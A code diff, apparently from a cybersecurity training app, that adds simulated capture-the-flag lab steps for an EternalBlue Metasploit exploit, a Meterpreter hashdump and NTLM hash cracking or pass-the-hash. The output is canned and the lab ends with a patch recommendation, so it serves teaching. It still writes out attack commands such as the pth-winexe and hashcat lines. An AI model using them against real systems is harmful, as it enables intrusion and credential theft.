+        sys("[*] Loading Metasploit module: ms17_010_eternalblue"),
+        blank(),
+        ...lines(`msf6 exploit(windows/smb/ms17_010_eternalblue) > run
+
+[*] Started reverse TCP handler on 10.14.0.5:4444
+[*] 10.10.10.40:445 - Connecting to target for exploitation.
+[+] 10.10.10.40:445 - Connection established for exploitation.
+[+] 10.10.10.40:445 - Target OS selected Valid for use with payload ++
+[*] 10.10.10.40:445 - Triggering free of corrupted buffer.
+[*] Sending stage (200774 bytes) to 10.10.10.40
+[*] Meterpreter session 1 opened`),
+        blank(),
+        out("meterpreter > getuid"),
+        out("Server username: NT AUTHORITY\\SYSTEM"),
+        blank(),
+        ok("[+] SYSTEM ACCESS ACHIEVED! EternalBlue worked — kernel-level compromise."),
+        warn("[!] NT AUTHORITY\\SYSTEM is the highest privilege on Windows."),
+      ],
+    },
+    {
+      id: "hashdump",
+      instruction: "Dump all NTLM password hashes from the SAM database",
+      detail: "With SYSTEM privileges, you can read the SAM (Security Account Manager) database and extract NTLM hashes for all local accounts. Use these for offline cracking or Pass-the-Hash.",
+      hint: "Try: hashdump (in Meterpreter)",
+      validate: (i) => matchCmd(i, ["hashdump", "run post/windows/gather/smart_hashdump", "meterpreter > hashdump"]),
+      execute: () => [
+        out("meterpreter > hashdump"),
+        blank(),
+        ...lines(`Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+haris:1000:aad3b435b51404eeaad3b435b51404ee:8002bc89de91b6b77fd3b2c4ccb2b5eb:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::`),
+        blank(),
+        ok("[+] NTLM hashes extracted!"),
+        info("[*] Crack with: hashcat -m 1000 hashes.txt rockyou.txt"),
+        info("[*] Or use Pass-the-Hash directly: pth-winexe -U Administrator%hash //target cmd"),
+        blank(),
+        warn("[!] Flag: FLAG{3t3rn4lbl00_k3rn3l_0wn3d} — SYSTEM via EternalBlue. Document and patch recommendation: MS17-010 patch KB4012212."),
+      ],
+    },
+  ],
+};
+
 // ─── Registry ─────────────────────────────────────────────────────────────────
 
 export const LAB_SCENARIOS: Record<number, LabScenario> = {
@@ -937,6 +1710,13 @@ export const LAB_SCENARIOS: Record<number, LabScenario> = {
   7: hashcatScenario,
   8: msfScenario,
   9: privescScenario,
+  11: shodanDeepScenario,
+  24: bashReconScenario,
+  32: msfvenomScenario,
+  36: hydraScenario,
+  37: gobusterScenario,
+  40: eternalBlueScenario,
+  42: redisRceScenario,
 };
 
 export function getScenarioForLesson(lessonId: number): LabScenario | null {
